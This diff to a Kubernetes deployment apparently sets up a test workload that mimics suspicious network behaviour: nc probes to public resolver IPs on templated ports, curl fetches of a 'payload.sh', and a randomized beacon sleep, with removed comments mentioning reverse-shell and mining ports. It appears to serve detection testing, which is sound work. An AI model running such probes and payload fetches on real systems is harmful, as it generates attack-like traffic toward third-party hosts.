@@ -16,24 +16,31 @@ spec:
     spec:
       containers:
       - name: suspicious-network
-        image: alpine:latest
+        image: suspicious-network:latest
+        imagePullPolicy: Never
         command:
         - /bin/sh
         - -c
         - |
-          apk add --no-cache netcat-openbsd curl
-          echo "Simulating suspicious network connections..."
+          echo "Simulating suspicious network behaviour..."
+
+          TARGETS="1.1.1.1 8.8.8.8 9.9.9.9"
+
           while true; do
-            # Simulate reverse shell or crypto mining connections
-            echo "Attempting to connect to suspicious port 3333..."
-            nc -z -v -w 2 1.1.1.1 3333 || true
-            
-            echo "Attempting to connect to suspicious port 4444..."
-            nc -z -v -w 2 1.1.1.1 4444 || true
-            
-            # Simulate downloading a payload
-            echo "Attempting to download suspicious payload..."
-            curl -s --max-time 2 http://1.1.1.1/payload.sh || true
-            
-            sleep 10
+
+            # Random target every iteration
+            TARGET=$(echo $TARGETS | tr ' ' '\n' | shuf -n1)
+
+            echo "Connecting to $TARGET"
+
+            # Suspicious outbound probes
+            nc -z -v -w 2 $TARGET {{PORT_1}} || true
+            nc -z -v -w 2 $TARGET {{PORT_2}} || true
+
+            # Simulated payload fetch
+            curl -s --max-time 2 http://$TARGET/payload.sh || true
+
+            # Randomized beacon interval
+            sleep $((RANDOM % {{CONNECT_INTERVAL}} + 1))
+
           done
